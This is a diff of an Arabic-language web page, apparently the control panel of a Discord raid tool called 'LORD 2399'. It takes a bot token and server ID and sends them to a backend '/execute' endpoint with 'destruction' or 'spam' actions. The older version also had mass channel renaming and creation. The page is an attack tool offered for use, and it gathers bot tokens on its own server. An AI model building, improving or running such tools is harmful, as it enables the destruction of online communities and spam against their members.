@@ -1,82 +1,61 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>LORD 2399</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Cairo:wght@900&display=swap');
-        body { margin: 0; background: #000; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
-        #v { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; object-fit: cover; }
-        /* لوحة شفافة جداً */
-        .card { width: 85%; max-width: 340px; background: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 0, 0, 0.3); border-radius: 20px; padding: 20px; text-align: center; color: #fff; backdrop-filter: blur(1px); -webkit-backdrop-filter: blur(1px); }
-        h1 { font-family: 'Orbitron'; color: #f00; text-shadow: 0 0 10px #f00; font-size: 22px; }
-        input, textarea { width: 100%; padding: 10px; margin: 5px 0; background: rgba(0,0,0,0.5); border: 1px solid #333; color: #fff; border-radius: 10px; }
-        .btn { width: 100%; padding: 12px; background: rgba(200, 0, 0, 0.5); color: #fff; border: none; border-radius: 10px; font-weight: 900; cursor: pointer; margin-top: 5px; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; }
-        .btn-s { background: rgba(0, 0, 0, 0.4); border: 1px solid #f00; padding: 8px; font-size: 10px; color: white; border-radius: 8px; }
+        body { margin: 0; background: #000; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: sans-serif; }
+        #bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; object-fit: cover; }
+        
+        /* اللوحة مخفية جداً */
+        .card { 
+            width: 85%; max-width: 350px; 
+            background: rgba(0, 0, 0, 0.15); /* شبه شفافة تماماً */
+            border: 1px solid rgba(255, 0, 0, 0.2); 
+            border-radius: 20px; padding: 25px; 
+            text-align: center; color: #fff;
+            backdrop-filter: blur(1px); -webkit-backdrop-filter: blur(1px);
+        }
+
+        h1 { color: #f00; text-shadow: 0 0 10px #f00; font-size: 24px; margin-bottom: 20px; }
+        input, textarea { width: 100%; padding: 12px; margin: 8px 0; background: rgba(0,0,0,0.3); border: 1px solid #444; color: #fff; border-radius: 10px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 14px; background: rgba(255, 0, 0, 0.4); color: #fff; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <video autoplay loop muted playsinline id="v">
+    <video autoplay loop muted playsinline id="bg">
         <source src="https://a.top4top.io/m_3745ydpjj9.mp4" type="video/mp4">
     </video>
 
-    <div id="s0" class="card">
-        <h1>2399 SYSTEM</h1>
-        <p style="font-size:12px">سيرفرنا: <a href="https://discord.gg/2399k" style="color:red">اضغط هنا</a></p>
-        <label><input type="checkbox" id="c1"> أتعهد بالدخول</label>
-        <button class="btn" onclick="next(0,1)">دخول</button>
-    </div>
-
-    <div id="s1" class="card hidden">
-        <h1>LOGIN</h1>
-        <input type="password" id="tk" placeholder="TOKEN">
-        <input type="text" id="id" placeholder="GUILD ID">
-        <button class="btn" onclick="next(1,2)">CONNECT</button>
-    </div>
-
-    <div id="s2" class="card hidden">
-        <h1>PANEL</h1>
-        <input type="text" id="nm" placeholder="اسم الرومات">
-        <div class="grid">
-            <button class="btn-s" onclick="run('أسماء')">تغيير أسماء</button>
-            <button class="btn-s" onclick="run('رومات')">إنشاء رومات</button>
-        </div>
-        <textarea id="ms" placeholder="رسالة السبام"></textarea>
-        <button class="btn-s" style="width:100%" onclick="run('سبام')">إرسال سبام</button>
-        <button class="btn" onclick="run('التدمير')">ابدأ التدمير 💀</button>
+    <div id="step1" class="card">
+        <h1>LORD 2399</h1>
+        <input type="password" id="tk" placeholder="BOT TOKEN">
+        <input type="text" id="id" placeholder="SERVER ID">
+        <button class="btn" onclick="runAction('تدمير')">ابدأ التدمير 💀</button>
+        <button class="btn" style="background:rgba(0,0,0,0.5)" onclick="runAction('سبام')">سبام فقط ⚡</button>
+        <p style="font-size:10px; margin-top:15px; opacity:0.6">https://discord.gg/2399k</p>
     </div>
 
     <script>
-        function next(f,t){
-            if(f==0 && !document.getElementById('c1').checked) return alert("وافق أولاً");
-            document.getElementById('s'+f).classList.add('hidden');
-            document.getElementById('s'+t).classList.remove('hidden');
-        }
-
-        async function run(act) {
-            const data = {
-                token: document.getElementById('tk').value,
-                guildId: document.getElementById('id').value,
-                customName: document.getElementById('nm').value,
-                customMsg: document.getElementById('ms').value,
-                action: act
-            };
+        async function runAction(act) {
+            const tk = document.getElementById('tk').value;
+            const id = document.getElementById('id').value;
+            if(!tk || !id) return alert("أدخل البيانات يا لورد");
 
             try {
-                // استخدام مسار كامل لضمان وصول الطلب
-                const response = await fetch(window.location.origin + '/execute', {
+                // إرسال الطلب لـ Render
+                fetch('/execute', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify({ token: tk, guildId: id, action: act })
                 });
-                const resData = await response.json();
-                alert(resData.status);
+                
+                alert("🚀 انطلق الهجوم! شيك على السيرفر");
             } catch (e) {
-                alert("⚠️ جارٍ التنفيذ.. (إذا لم يظهر خطأ توكن فالبوت بدأ فعلياً)");
+                alert("خطأ في السيرفر");
             }
         }
     </script>
